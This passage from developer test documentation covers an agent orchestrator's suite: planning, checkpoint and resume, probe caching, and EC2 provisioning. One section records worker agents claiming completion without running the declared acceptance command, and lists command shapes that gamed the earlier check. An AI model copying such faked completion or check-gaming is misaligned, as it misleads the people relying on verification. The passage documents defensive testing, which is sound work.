repair. The `--source-of-truth` bullet is **demoted and conditioned**,
not deleted: DESIGN §11 calls narrowing the preference *historically*
the escape hatch, and the bullet still fires when the effective value
isn't `codebase`. Operators ignored it 0/5 in both arms; the *useful*
bullet is what moved them, pinned with an anti-vacuity partner requiring
the text to say widening is often wrong, plus a guard that the stated
shape count matches the bullets (the first draft said "two shapes" and
printed three). The message was extracted to a module-level pure
function first — it had been inline in a closure, which is why the prior
test **re-synthesized the closure body** with a local stub calling
`leerie.die("test-die: …")`, a copy that passed regardless of the real
code.

`tests/test_reconciler_payload_fields.py` guards a prompt↔code drift of
the same family: `prompts/reconciler.md` scopes `conditional_drop` to
signals in `intent`/`scope_note` while the payload shipped only `intent`,
making half the signal surface invisible. The *shipped-fields* check
derives its field list from the prompt text at test time, with a
guard-the-guard beside it (`test_conditional_drop_rule_still_names_both_halves`,
pinning `{intent, scope_note}`), so a third signal field added to the
prompt fails it. Payload keys are read **structurally** off the
`subtask_views.append` dict literal — a first draft scanned
`ast.unparse` output for `"scope_note": s.get(` and failed against
correct code, since the unparser emits single quotes.

### Planner extent fencing and the fence-probe sandbox harness

`tests/test_planner_extent_out_of_scope.py` gained the third
`extent: external` kind. Its load-bearing assertion is an **ordering**
one — the fence question must precede the connector question, since
"could a connector subtask produce this?" answers *yes* for a fenced
code change; a test asserting both sentences merely exist passes against
the unfixed file, which already contains the connector one. Every prose
guard normalizes whitespace through `_norm`, so re-wrapping a
hand-wrapped markdown line isn't a false alarm; the absence guard
matters most, since an un-normalized one fails silently across a line
break. Because the prompt is advisory, those guards prove only that the
words are present: the behavioural evidence is a sandbox experiment
scoring the pre-fix prompt at 1/6 and the as-shipped wording at 17/18,
p = 0.00081. The harness ships as `tests/manual/planner_fence_probe.py`
— **not** collected by pytest, same arrangement as
`tests/fixtures/incident_2026_07_19/generate.py`, since it spawns real
`claude -p` workers. It extracts the rules from the live
`prompts/planner.md` and must run against a **sandbox copy** with
planning docs removed: two earlier attempts were contaminated by a task
doc corrected *after* the failing run. **Re-run it before trusting an
edit to that section** — the first re-validation came back 5/6 where the
design draft had scored 6/6, so the sample was extended rather than the
difference assumed away. Related: `_demote_unresolvable_with_external_twin`
has **never fired in 258 recorded runs** — every measured improvement
here has come from the prose, not the code backstop.

### Id-vanishing `depends_on` rewrite

The id-vanishing `depends_on` rewrite (DESIGN §5 *Id-vanishing
operations* — every op removing a subtask id owes the plan a rewrite of
inbound references; the tag channel self-heals via inherited `provides`,
so only the id channel dangles) is tested across five files.
`tests/test_remap_vanished_deps.py` unit-tests `_remap_vanished_deps`:
fan-out (a vanished parent → every leaf), prune (`id → []`), empty-mapping
no-op, dep-absent-from-mapping pass-through, dedup-after-rewrite and
two-vanished-ids-sharing-a-successor (mirrors `_apply_overlap_merge`),
and the `repl != sid` self-reference guard — pinned but **currently dead
code**, unreachable because `_schedule()` already die()s on a planner
self-edge before recursion runs; retained to match
`_apply_overlap_merge`'s discipline for future callers.

`tests/test_recursive_decompose.py` covers the intra-generation remap —
the seam `phase_plan` can't see: a splitter child declaring `depends_on`
on a sibling whose id then vanishes when that sibling splits again,
asserting the survivor fans out to the terminal ids; plus the
migration-path no-op, driving a **hostile** label-only worker injecting
sibling deps and proving `_migration_child` discards them (children keep
the parent's `depends_on`/`provides` verbatim on the ~84% path).
`tests/test_phase_plan_recursion_wiring.py` covers the cross-subtask
remap: the reported regression (a sibling of an expanded parent fans out
to all leaves and `_validate_plan` no longer die()s — the gate that
killed a real run after full planner spend), a dep on an unexpanded
subtask left untouched, dedup when a sibling already names a leaf.
`tests/test_filter_satisfied_subtasks.py` and
`tests/test_filter_offtree_subtasks.py` cover the two phase-3 soft-drop
filters, which vanish ids the same way: dropped-id inbound refs pruned,
`_validate_plan` survives end-to-end, and a no-drop run leaves
`depends_on` byte-identical.

`tests/test_declared_commands_executed.py` covers the settle-time
declared-command check (DESIGN §"A declared command must also have been
executed" — measured barnacle 2026-09-22: a subtask declared the task's
one empirical acceptance command in `runs_commands`, never issued it, and
settled `complete` across ten runs). Pure-function cases pin the settled
matching rule in BOTH accepted directions: literal declared covered
inside a pipeline / `cd … &&` prefix; paraphrase declared covered when
the executed segment appears as a length-≥2 CONTIGUOUS ordered sublist
of the declared salient-token list, WHEREVER the command sits (tail —
which the suffix rule already passed — plus mid-string, trailing-prose,
and either half of a declared compound: the suffix-only rule's
false-alarm rows, each of which looped into a
false `blocked`); non-adjacent fragments reassembled from the paraphrase
pinned UNRUN ("pnpm run", "make test", "run test", "sure green", bare
"pnpm"); the DOCUMENTED near-miss residual class pinned as ACCEPTED, not
an oversight (`test_near_miss_execution_is_accepted_residual`: parent
sub-command, flag-dropped variant, `--help`-probed literal, adjacent
prose pair — with the design rationale in the test comment); the
glued-punctuation false-alarm residual pinned
(`test_glued_punctuation_still_false_alarms`); quoted-inside-`grep` and
differing-binary `--help` invocations NOT counted; and the three
cross-segment union gaming shapes (`pnpm install && ls test` etc.) NOT
counted — the union rule they bypassed was removed.
`DECLARED_CMD_UNRUN` is pinned gating (`_gating_issues` passthrough).
`_executed_bash_commands` is pinned on a real JSONL fixture (order
preserved; the same fixture appends a non-Bash tool_use and a malformed
line, both ignored; missing log → `[]`). The settle wiring drives the
real `_settle_subtask` via `test_oom_naming.py`'s `env` fixture:
unexecuted → one corrective re-drive whose feedback note names the
command, then `blocked` (never a silent `complete`) with the command in
the blocker AND the N21 `accept-blocked <run-id> <sid>` remedy in the
log; an `empty_handoff` rescue with the command unrun settles COMPLETE
with the warning persisted to `declared_unrun_warnings` (blocking would
strand the rescued commits — the accept-blocked resume skip never
integrates them); a clean later attempt POPS the stale warning
(`test_clean_later_attempt_clears_the_stale_warning`); executed →
completes with exactly one implementer spawn; undeclared → untouched
(anti-vacuity control). `phase_finalize` surfaces the warnings as a
`note —` line (`tests/test_finalize_execution.py::
test_phase_finalize_surfaces_declared_unrun_warnings`). The N21 guard
itself (`tests/test_settle_subtask_completeness_gate.py`) asserts the
remedy shape at EVERY `[sid] = "blocked"` occurrence, not just the
first.

`tests/test_probe_typed_reason.py` covers the typed not-satisfied probe
verdict (DESIGN §8 *A "not satisfied" verdict carries a typed reason* —
measured 2026-09-22: 58% of all not-satisfied verdicts corpus-wide rested
solely on a planner-invented file path not existing yet, so a re-run of a
done task never came up empty): the `_probe_drop_reason` truth table
(only `satisfied: true` and the three-field conjunction
`artifact_missing` ∧ `equivalent_coverage_exists` ∧ an explicit
`sibling_invalidation_risk: false` drop; the parametrized keep cases
make the fields *disagree* — including risk `true`, risk absent, and
risk falsy-but-not-`False` — so a one- or two-field consumer fails, and
the sibling-invalidation channel is pinned keep-only by construction),
the executed consumer (`_filter_satisfied_subtasks` drops with
`reason: "equivalent_coverage"`, survives on disagreement, routes no-work
when the drop empties the plan), the cache round-trip (typed fields
persist and replay the drop with zero re-probes), schema enum
enforcement, and `_filter_provably_false_wiring_defects` predicate 2
treating an `equivalent_coverage` drop's tags as satisfied-on-base.
The same file pins the pre-schedule probe's `max_turns=20` on the
executed filter — the converse of the HEAD-probe's 40 pinned in
`tests/test_mid_run_satisfied_no_commits.py` (DESIGN §8: the
asymmetric caps are consequence-justified — a HEAD-probe cap-out
had no recovery below the run level), so the deliberate asymmetry
cannot silently collapse in either direction.

### Planning checkpoints: snapshot, decompose-crash barrier, schedule determinism

`tests/test_plan_snapshot_wiring.py` pins `plan_snapshot` by source
inspection: the assignment follows `_schedule()`, precedes **both**
`check_budget_feasibility` and `_validate_plan` (a die() at either
otherwise discards the whole planning spend), is deliberately not
`_write_plan`, and round-trips through a real `State.save()`.

`tests/test_decompose_snapshot.py` is `plan_snapshot`'s sibling for the
D3 crash barrier: a `WorkerError` from `_recursive_decompose`'s
`fit_judge` call degrades the node to a leaf rather than discarding
sibling subtasks' completed decisions. A `WorkerError` from the
coupled-minority `splitter` call degrades to a leaf the same way —
`TestSplitterCrashBarrier` pins this as D3's surviving half, since the
`fit_judge` guard alone left it unguarded. `phase_plan`'s expansion loop
persists `st.data["decompose_snapshot"]` after each top-level subtask, so
a later crash still preserves earlier leaves; a normal run's final leaf
count matches `plan["subtasks"]`; and `test_decompose_snapshot_precedes_the_die_gates`
pins `_run_phases` calling `phase_plan` strictly before
`check_budget_feasibility` and `_validate_plan`.

The safety-by-construction property the resume checkpoint design rests
on — that `_schedule()` (`:17334`) re-sorts every wave by subtask id
(`wave = sorted(...)`, `:17374`), making the wave partition a pure
function of the dependency graph plus lexicographic ids — is pinned
directly, no state/stubs/async, in `tests/test_schedule_determinism.py`:
a multi-domain fixture (intra-domain `depends_on` and cross-domain
`requires`/`provides`) produces identical `waves` and subtask-id sets
across a fresh call, a JSON round-trip, reversed plan order, and
reversed subtask order. A companion test asserts every wave is
lexicographically sorted directly — round-trip equality alone doesn't
kill a `sorted(...)` removal (unsorted set iteration is self-consistent
within one process), so the per-wave sortedness check is what actually
fails when `sorted(...)` is removed at `:17374`.

### Resumable-planning checkpoint keys and the STATE_FIELDS discipline

The resumable-planning checkpoint keys (`plans_after_classify`,
`plans_after_plan`, `plans_after_reconcile`, `plans_after_overlap_judge`,
`plans_after_adherence_gate`, `plans_after_filters`,
`satisfied_probe_cache` — DESIGN §6 "Resumable planning") are pinned by
name in `tests/test_resumable_planning_keys.py`, on top of the generic
bidirectional parity `tests/test_state_fields.py` already enforces: each
key is present in `leerie.STATE_FIELDS` and has a row in
IMPLEMENTATION.md §8's field table, plus a regression pin that the table
no longer carries the old "A run that died on the preflight is not
resumable" claim now that `plan_snapshot` makes a budget-check-stopped
run resumable. bugfix-002 registered the keys; resume-rehydration code is
separate (bugfix-004). `tests/test_planning_checkpoint_keys.py` adds a
real `State.save()`/on-disk JSON reload round-trip with all seven
checkpoint keys populated, plus a `State.load()` round-trip proving the
reloaded in-memory `.data` dict — not just the on-disk artifact —
reproduces every key byte-equal.

**Contributor discipline for adding a new checkpoint/state key:**
`STATE_FIELDS` (`orchestrator/leerie.py:259`) is a static allowlist
checked by `tests/test_state_fields.py`, not a runtime filter —
`State.load()` reads the whole on-disk `state.json` unconditionally, so
an undeclared key isn't silently dropped on `resume`; instead
`test_state_fields.py::test_every_st_data_write_is_declared` fails the
moment an undeclared `st.data["x"] = ...` write lands — though that
guarantee held for the **subscript form only** until 2026-08-10.
`_runtime_field_writes` matched the run-init dict literal with
`re.search(r"st\.data\s*=\s*\{(.*?)\}", ...)`, and two bugs compounded:
no word boundary, so `bst.data = {}` (the `_BackstopState` stub) matched,
and `re.search` returns the **first** match, whose non-greedy body
captured **zero characters**. Measured before the fix: the matcher saw
67 keys where a correct one sees 70, blind to exactly the three
literal-only keys (`task`, `started_at`, `worker_count`). Now an AST
walk, which also kills the `bst` false match by construction.
`test_state_fields_matches_spec_table` fails if the IMPLEMENTATION.md §8
table and `STATE_FIELDS` drift out of sync. The resumable-planning
checkpoint keys additionally get named guard-the-guard pins so a future
refactor dropping one of these seven specifically fails with a message
naming the checkpoint feature, not a generic diff. The practical rule:
any new `st.data[...]` write must land in the same commit as its
`STATE_FIELDS` entry and its IMPLEMENTATION.md §8 row, or CI catches it
immediately.

### Checkpoint-writing order and resume re-entry

The checkpoint-writing half — `_run_phases`'s fresh-run branch persisting
each `plans_after_*` key immediately after its producing phase returns —
is pinned in `tests/test_plans_after_checkpoints.py` via
`inspect.getsource(leerie._run_phases)` (driving `_run_phases`
end-to-end is infeasible: it spawns real workers, shells to git/preflight).
Pinned: all six `plans_after_*` keys appear as `st.data[...]`
assignments; each is followed by `st.save()` within 200 chars; each sits
strictly *after* its phase's call — never at entry, the same
"`current_phase` stamped at entry, not completion" trap `plan_snapshot`
guards against; `plans_after_reconcile` precedes the `_detect_no_work`
short-circuit and `plans_after_filters` precedes both
`satisfied_no_work` and `_schedule()`; the six keys' first-occurrence
order matches pipeline order; `plans_after_filters` precedes
`plan_snapshot`.

`tests/test_planning_checkpoint_ordering.py` is a second, independent
pin of the same write-ordering invariant, plus the resume-cursor's
gating on checkpoint-key presence rather than `current_phase`, and the
earliest re-entry gate keying on `waves`/`categories` presence.
Deliberately overlapping rather than folded in: the standalone
regression guard for the single highest-severity trap in this feature (a
checkpoint written at phase entry would mark an incomplete phase done),
kept small so it can't be diluted by unrelated changes elsewhere.

The re-entry (`resume`-consuming) half — that a `state.json` checkpointed
through phase K reloads and re-enters at K+1 without re-invoking any
completed phase's worker — is pinned behaviorally in
`tests/test_resume_planning_reentry.py`. It drives real `_run_phases`
end-to-end with every phase stubbed via call-counting monkeypatches, a
stubbed `phase_execute` raising a sentinel exception, and asserts, per
`plans_after_*` checkpoint present, that every phase up to and including
it is absent from the call log and every phase after ran exactly once.
`TestPerPhaseRoundTrip` covers all six boundaries (classify → plan →
reconcile → overlap_judge → adherence_gate → filters → schedule).
Anti-vacuity: completed phases are stubbed with counters that would fire
if called, and the fixture never pre-seeds downstream output. Also
pinned: `phase_provision`'s key-presence-not-truthiness resume-skip (an
empty `recipe: []` is valid completed state); the reported incident
directly (a partial `satisfied_probe_cache` and no `plans_after_filters`
resumes through to `_write_plan` instead of dying); post-scheduling
resume falling straight to `phase_execute`; budget-check resume
rehydrating `plan_snapshot` instead of the old "Plans are not persisted"
die; `_schedule()`-determinism end-to-end; an allowlist guard that every
checkpoint key read is in `STATE_FIELDS`; the old
`"did not reach the scheduling phase"` string gone from source; and a
state.json with zero progress still `die()`ing.

`tests/test_resume_planning_regression.py` is a narrower end-to-end lock
on top of the per-phase stub sweep: it drives `_run_phases` with only
phases upstream of `_filter_satisfied_subtasks`/`_schedule` stubbed,
leaving `_filter_satisfied_subtasks`, `_schedule`,
`check_budget_feasibility`, and `_write_plan` REAL against a real temp
git repo. (a) reproduces the reported incident verbatim: a partial
`satisfied_probe_cache` resumes, re-probes only uncached sids, reaches
scheduling with no die() — paired with a falsification test replaying
the retired `"waves" not in st.data` gate to confirm it would have died,
proving (a) exercises the fixed path. (b) reruns `check_budget_feasibility`
twice against the same `plan_snapshot` — once under a low cap (dies),
once raised on a fresh `State` reload — asserting `_write_plan` runs
exactly once with no upstream re-run. (c) asserts a `waves`-present
resume reaches `phase_execute` with zero planning-phase calls. (d)
covers both early-return guards, including checkpoints present but
`no_work_required` still winning. A final grep guard (prior art
`tests/test_ec2_launcher_dispatch_e2e.py`) asserts neither retired die()
string survives as a live `die(...)` call.

### satisfied_probe cache: writing, invalidation, and sibling-service

The `satisfied_probe_cache` checkpoint-writing half (bugfix-005) is
tested in `tests/test_filter_satisfied_subtasks.py`: a cache hit under
the CURRENT `base_sha` is consulted before `async with sem:` and
`claude_p` is never invoked; a fresh probe persists its verdict for BOTH
outcomes, carrying `satisfied`/`evidence`/`checked`/`base_sha`; the
`WorkerError` crash-keep path writes no cache entry; a cached verdict
whose `base_sha` differs from the current base tree (the working
branch's tip, else `HEAD` — `_base_tree_sha`) is invalidated and
re-probed (the mid-run-sibling hazard — DESIGN §6); and THE REPORTED
FAILURE PINNED — a partial cache resumes, re-probes only uncached
subtasks, reaches scheduling. All 17 pre-existing tests unchanged (17 + 5
= 22 passing). `tests/test_satisfied_probe_cache.py` is a dedicated,
narrower pin for the same `probe_one` mechanism in isolation: a cached
`satisfied` verdict drops the subtask with ZERO `claude_p` calls, a
cached not-satisfied verdict keeps it with zero calls, an uncached sid is
probed exactly once with the verdict persisted for both outcomes, and a
`WorkerError` crash keeps the subtask while asserting the cache KEY is
ABSENT — the anti-vacuity discipline from the zombie-reaper harness
lesson. The same file pins the fix for a real mid-sweep data-loss defect
(2026-07-29 root-cause batch, PR #120): `probe_one` wrote each verdict to
`cache[sid]` in memory with no per-verdict `st.save()` — only the
post-`gather` aggregate save persisted — contradicting both commit
750ce33's message and DESIGN §6, both of which claim per-verdict
persistence; a pause mid-sweep silently lost every already-decided
verdict. `test_verdict_reaches_disk_before_the_sweep_completes` pins the
fix (`st.save()` immediately after `cache[sid] = {...}`); reverting the
added save fails the test.

The sibling-service half of the same incident batch — a satisfied-probe
drop blind to a surviving sibling's pending work invalidating the
criterion it just judged met — is pinned by two tests in
`tests/test_filter_satisfied_subtasks.py`:
`test_probe_payload_carries_surviving_siblings_excluding_self` (the
`sibling_surface`, built once per sweep, contains every other subtask
with non-empty `provides`/`files_likely_touched`, never the probed
subtask) and `test_sibling_invalidation_verdict_keeps_the_dropped_test`
(a test subtask the base tree already satisfies is NOT dropped when the
probe, given `surviving_siblings`, judges a sibling's pending work would
break it). The guidance lives in `prompts/satisfied_probe.md`'s "A
sibling's pending work can invalidate an already-met criterion" section,
scoped to the pre-schedule call site (`surviving_siblings` is absent from
the post-execution `_probe_criteria_satisfied_on_head` payload, since
HEAD there already reflects whatever siblings committed).

P10 (evidence-citation requirement — `prompts/satisfied_probe.md`'s
amended guidance that success criteria naming test file paths are judged
by coverage/convention, and that the probe cite the specific
file+assertion) is pinned at the mechanically-checkable layer:
`test_schema_requires_evidence_on_satisfied_true_verdict` asserts
`SCHEMAS["satisfied_probe"]` rejects a `satisfied=True` verdict missing
`evidence` or with non-string `evidence`, and accepts a well-formed
citation; `test_satisfied_probe_prompt_exists_and_nonempty` is a
structural check. Prompt prose itself is unasserted — only a live LLM run
can verify the probe follows the amended instruction (prompts are
advisory, code enforces).

### Wiring-gate severity and test-ownership advisories

enforcer; the warn only reduces how often a plan reaches it broken. A
companion `TEST_OWNERSHIP_RISK` advisory in `check_classifier_output`
flags when `testing` is selected alongside `bug-fixing`/
`feature-implementation`/`refactoring` in the same category set — a real
prior incident where one category set produced both the code change and
its own test assertions with no ownership split.
`tests/test_phase_wiring_gate.py::test_die_message_does_not_recommend_skip_overlap_judge`
pins the corrected `phase_wiring_gate` die() message: it no longer
recommends `--skip-overlap-judge` (that flag skips the earlier, distinct
phase 2¾ overlap judge and doesn't touch this gate — the old wording sent
an operator right back into the same die()). The same file pins that each
`wiring_defects` entry's `severity` is **asked for but not `required`**
(changed 2026-08-03): requiring it defeated its own purpose — a judge
omitting the field produced no schema-valid payload at all, so the gate
never ran; measured across the run corpus, every `wiring_judge`
invocation that never produced valid output (9 of 66) failed on this
field, accounting for all 18 failing submissions; relaxing it took
`wiring_judge` to 100% and the global never-valid count from 13 to 4.
Both consumers already tolerate absence, so an unlabelled entry **gates**
— matching DESIGN §8 *Findings carry a severity* ("the default is
gating"), with anti-vacuity coverage that a declared `latent_risk` is
still excluded from gating.

### Artifact-registry worker and satisfied-probe-cache invalidation

The `artifact_registry` worker (DESIGN §5) — a pre-planning worker
reading the task plus the global repo-map and emitting a small canonical
`{description, tag, path}` vocabulary injected into every planner's
context, softening (not replacing) the reconciler's tag-drift resolution
— is tested in `tests/test_artifact_registry.py` (23 tests): schema
validity, worker registration parity (in `WORKER_TYPES`, absent from
`MODEL_DEFAULT_PER_WORKER` so it resolves to sonnet,
`EFFORT_DEFAULT_PER_WORKER["artifact_registry"] == "medium"`),
model/effort resolution, phase behavior (`test_phase_returns_artifacts`,
`test_phase_drops_malformed_items` — missing `tag`/`path` dropped,
`test_phase_degrades_to_empty_on_crash` — a `WorkerError` on every
`_run_checked_loop` round degrades to `[]`), `--skip-repo-map` degrade
(only `ctx_dict["repo_map"]` build is skipped) plus the repo-map
grounding branch itself, unexercised by every other phase-behavior test
(`_make_state` always seeds `skip_repo_map=True`): `_build_repo_map`/
`_rank_repo_map` are called and a non-empty ranked map reaches the
worker's prompt when not skipped, never called when skipped, an empty
ranked map omits the `repo_map` ctx key, and a crashing
`_build_repo_map` degrades silently — ctx-injection wiring
(`test_phase_plan_injects_registry_into_ctx`), checkpoint ordering
(`test_run_phases_checkpoints_registry_before_plan` — runs between
`gather_answers` and the `plans_after_plan` block), and a
`State.save()`/reload round-trip.

`tests/test_satisfied_probe_cache_invalidation.py` is the real-moving-repo
counterpart to the `base_sha` invalidation case above: it builds a real
temp git repo and advances HEAD from sha A to sha B via a second commit,
mirroring a sibling run merging (or reverting) the deliverable between a
pause and resume (DESIGN §8 "the mid-run sibling case"). Both stale
directions are pinned: a stale `satisfied=True` at A mustn't silently
drop a subtask no longer satisfied at B, and a stale `satisfied=False`
mustn't silently keep one that's since become satisfied. A cache entry
with missing/malformed `base_sha` is treated as a miss and re-probed.
The falsifier is verified live: deleting the `cached.get("base_sha") ==
base_sha` comparison in `probe_one` (`orchestrator/leerie.py:7402`) fails
4 of the file's 5 tests with a stale drop/keep.

### Conformer/baseline hardening

The conformer/baseline hardening (DESIGN §9 *No clobbering the
implementer's work* + the base-tree baseline's `measured` field) is
tested across three files. `tests/test_clobbered_owned_files.py` covers
`_clobbered_owned_files` against real temp git repos (legit conformer
edit not flagged; revert-to-base flagged; deletion flagged; a file
outside the implementer's owned set never flagged; new file added not
flagged; the load-bearing round-0 snapshot test — a per-round HEAD misses
a round-0 clobber while the pre-loop `impl_head_sha` catches it;
empty-ref no-op), `_blob_sha`'s present/absent contract (missing-path
returns None, guarding the bare `git rev-parse <ref>:<path>` footgun),
`_restore_tree` restoring clobbered content and dropping
the conformer commit (`TestRollbackRestoresClobber`), and source-coupling
guards that both `_run_conformance_phase` and `_run_final_conformance`
snapshot before the round loop and call the guard under
`strict_conformer`.

`tests/test_normalize_pip_installs.py` covers `_is_pip_install`/
`_normalize_pip_installs` (adds `--break-system-packages` to
`pip`/`pip3`/`python -m pip install` recipe entries): the incident recipe
entries, `-e .`, `python -m pip`, idempotency, non-pip/non-install
entries untouched, other fields preserved, and normalization running
before `prov["recipe"] = recipe` in `phase_provision`.
`tests/test_base_health_baseline.py` additionally covers `_runner_missing`
(`command not found`/`No such file or directory`), the `measured` field
on baseline axes (an unmeasurable axis surfaced as "could not measure,"
folded into neither GREEN nor RED), `measured` as mandatory with no
legacy default (a `passed: False` axis missing it isn't surfaced RED),
and the N8 fix — every BLT axis command is invoked as exact argv
`["bash", "-c", cmd]`, never a login shell (`-lc`), since a login shell
sources `/etc/profile`/`~/.bash_profile` and discards Docker-ENV-only
PATH additions (mise's shims dir) — a source pin, an argv-capture pin,
and a regression control reproducing the PATH-loss mechanism against
real subprocesses.

### AWS credentials, EC2 preflight, and the release workflow

The standalone AWS credential/profile/region resolver
(`scripts/remote/aws-credentials.sh`, EC2 runtime) is tested in
`tests/test_aws_credentials.py` by sourcing the real script against a
fake `$HOME` with fixture `~/.aws/config`/`~/.aws/credentials`/`~/.aws/sso/cache/`
files (mirroring `tests/test_fetch_branch_sh.py`'s source-and-call
pattern): explicit env-var credentials winning over a configured SSO
profile with a valid cached token; `AWS_PROFILE` selecting a named
profile over `[default]`; region precedence (`AWS_REGION` >
`AWS_DEFAULT_REGION` > profile `region` > die-with-hint); static
credentials; both `sso_session`-reference and legacy inline SSO config;
an expired SSO cache token and a never-logged-in profile both producing
the `aws sso login --profile <p>` hint; no `~/.aws` directory at all;
`AWS_PROFILE=nonexistent` not falling back to `[default]`; and
`--profile`/`--region` CLI flags overriding env-var equivalents. Pure
file I/O — no network, no `aws` binary, no boto3. Not yet wired into the
launcher's EC2 runtime path.

The EC2 runtime's host-side preflight (`scripts/remote/ec2-lib.sh`'s
`require_aws()`, modeled on `require_flyctl()`) is tested in
`tests/test_ec2_lib_sh.py` by sourcing the real script against a stubbed
`aws` binary (mirroring `tests/test_ensure_image.py`'s stubbed-flyctl
pattern): success when `aws` is present and `aws sts
get-caller-identity` succeeds; an actionable AWS CLI v2 install hint when
absent; the `aws sso login --profile <profile>` recovery hint (reusing
`bedrock_preflight()`'s vocabulary) when credentials are unresolvable;
profile resolution precedence (`--profile`, `LEERIE_AWS_PROFILE` over
`AWS_PROFILE`, `AWS_PROFILE` fallback) reflected in both the identity
call and the sso hint. Not yet wired into `RUNTIME=ec2` dispatch.

The release workflow's previously-untested embedded shell
(`.github/workflows/release.yml`) is covered in
`tests/test_release_workflow.py` against the raw YAML text (no pyyaml),
using the extract-the-real-text-at-test-time pattern from
`tests/test_config_verb.py`'s `_extract_config_arm`: a regex table (the
v0.9.62 squash-merge subject and every historical
`chore(release):` subject on `main`, run live rather than pinned to a
stale count) and structural pins that tag/release steps gate on
different `if:` conditions, the release step never references
`tagcheck`, `relcheck` exists and probes via `gh release view`, `gh
release create` carries `--verify-tag`, and a final end-state step
(gated on `success()`, not `always()`) is the job's last step and
asserts both artifacts exist.

### EC2 lifecycle: stateful stub, provisioning, and volume reaping

The resource-tracking `aws` stub state machine (`tests/ec2_stub.py`,
distinct from `test_ec2_lib_sh.py`'s argv-only `_stub_aws`) models EC2 as
a persistent state machine — `run-instances` creates a tracked instance
that `stop-instances`/`start-instances`/`terminate-instances` transition
through, `create-volume`/`delete-volume` likewise — so downstream tests
can assert on resource *leaks*, not just argv. It exposes `_stub_aws(dir)`,
`read_state(dir)`, `read_log(dir)`, and `leaked_resources(state)`.
Self-tests in `tests/test_ec2_stub.py` pin the state transitions,
`leaked_resources()` on clean/unclean teardown, multi-instance
independence, the real `aws` CLI's `--instance-ids i-1 i-2`
space-separated multi-value syntax (not a repeated flag), ordered
invocation logging, and a structural guard that the stub source contains
no networking imports (`socket`, `urllib`, `http.client`, `requests`,
`boto3`). Pure test fixture, importable ahead of the EC2 dispatch branch
landing. `ec2_stub.py` also implements `describe-instance-status`
(`InstanceStatus`/`SystemStatus` both `"ok"` for `running`,
`"initializing"` when seeded `status_ok: False`), consumed by
`wait_for_instance_ready()`'s poll-until-both-ok contract.

`scripts/remote/ec2-provision.sh` (`provision_instance()`,
`wait_for_instance_ready()`, `stop_instance()`/`terminate_instance()`,
`decide_ec2_teardown()`) is tested in `tests/test_ec2_provision.py`
against the stateful stub: required-var validation (missing
`LEERIE_EC2_AMI`/missing `aws` binary both fail closed); instance-id
export and `ec2-instance.json`/`run.json` sidecar writes on success;
id-parsing against real-shaped `run-instances` JSON; a failed create
leaking no resources and never registering the teardown trap;
`terminate_instance`'s no-op-on-empty-id idempotency; and
`decide_ec2_teardown`'s three-disposition classification (clean-exit
terminates, sync-failure leaves the instance running, SIGINT detaches,
unknown rc pauses), including `_try_fetch_state_for_ec2_teardown`
running before `terminate_instance` and teardown idempotency under
`LEERIE_TEARDOWN_DONE`.

`tests/test_ec2_volume_reaping.py` pins the EBS-volume side: DESIGN §6
"EBS volume lifecycle" case 1 (root volume only, AWS's implicit
`DeleteOnTermination=true` default) means there's no Fly-style
`destroy_volume()` reap path to test — instead this file pins the actual
leak-prevention mechanism (`run-instances` invoked with no
`--block-device-mapping`/`--block-device-mappings` override, at both
stub-argv and source-grep level against `DeleteOnTermination` appearing
in the call block), that `terminate_instance` is a true no-op on an
empty instance id, a full provision→terminate cycle leaking neither
instances nor volumes (with an explicit assertion no `create-volume`
call ever happens), and a structural regression guard that no
`destroy_volume`/`reap_volume`-shaped function exists anywhere in
`ec2-lib.sh` or `ec2-provision.sh`.
## EC2 seed-repo transport

The EC2 counterpart to `scripts/remote/seed-repo.sh` — `scripts/remote/
ec2-seed-repo.sh` (`ec2_seed_repo_clone`/`ec2_seed_repo_dirty`/
`ec2_seed_repo`, transported over `ec2-lib.sh`'s `ec2_tar_pipe`/
`ec2_remote_exec` instead of `flyctl ssh console`) is tested in two files
modeled on `tests/test_seed_repo_sh.py` + `tests/test_seed_repo_shallow_roundtrip.py`.
`tests/test_ec2_seed_repo.py` covers the transport-level contract against a
stubbed `aws` (decodes and locally executes `ec2_remote_exec`'s base64-wrapped
SSM command, rewriting `/work`/`/tmp/leerie-*` paths into the test's `dest`
dir — same technique as `test_ec2_transport.py`'s `_stub_aws_ssm`) and a
stubbed `ssh` (drains `ec2_tar_pipe`'s one-entry gzipped-tar payload for bulk
data, execs a real local `rsync --server` for rsync's `-e` transport):
preflight failures (missing instance id / ssh target / `USER_REPO` / `aws` on
PATH); a minimal repo round-trips to `/work`; both `aws` and `ssh` are
exercised and `flyctl` never appears in the transport log; `.gitignore`-
awareness plus `.claude/` force-inclusion via the rsync delta; the
`.leerie/config.toml` / `.leerie/Dockerfile` / `.leerie/.leerie-setup.sh`
whitelist (all other `.leerie/*` paths dropped); NFC-filename preservation
through a submodule bundle; and a stalled `ssh` transport (real, unstubbed
`timeout`) yielding a non-hanging failure. `tests/test_ec2_seed_repo_shallow.py`
reproduces the shallow-path host/instance commands directly (coupled to the
real script via `test_reconstruction_matches_source`, asserting the exact
clone/tar/checkout strings are present) to pin: checkout parity between the
shallow instance tree and the host tip, `.git/shallow` staying shallow,
NFC-filename survival, a fetch-back-by-branch-name round-trip whose merge-base
equals the host tip (PR-diff correctness), and `_seed_branch_shallow_safe`'s
shell-injection gate (safe vs. unsafe branch names, including the live
`__PARENT_MATERIALIZE__`/`__CLEANUP_TMP__` placeholder tokens) invoked against
the real function rather than a reproduction of it.

## EC2 seed-auth transport

The EC2 counterpart to `scripts/remote/seed-auth.sh` —
`scripts/remote/ec2-seed-auth.sh`'s `ec2_seed_auth()` — is tested in
`tests/test_ec2_seed_auth.py`, modeled on `tests/test_seed_auth_sh.py` and
reusing `tests/test_ec2_seed_repo.py`'s stubbed-`aws`/stubbed-`ssh` transport
harness (the `aws` stub rewrites `/home/leerie` into the test's `dest` dir;
the `ssh` stub drains `ec2_tar_pipe`'s gzipped-tar-of-`$STAGE` payload into
the same rewritten dest): a `$STAGE` dir containing `.claude/`,
`.claude.json`, and `.gitconfig` round-trips to the instance's home dir with
ownership fixed to `leerie:` (asserted via a `chown_log` sink so the test
observes the real script issuing the call, not just its source text); the
`CLAUDE_CODE_OAUTH_TOKEN` fallback writing a valid single-token
`.credentials.json` when `$STAGE` has none; `plugins/cache` and
`plugins/marketplaces` excluded from the tar (both a positive check that the
exclude list matches `seed-auth.sh`'s original and a check that files outside
those dirs are not swept up); preflight failing closed on missing
`LEERIE_EC2_INSTANCE_ID` / `LEERIE_EC2_SSH_TARGET` / `STAGE` / `aws` on PATH /
credentials-or-token / git identity; git identity written to
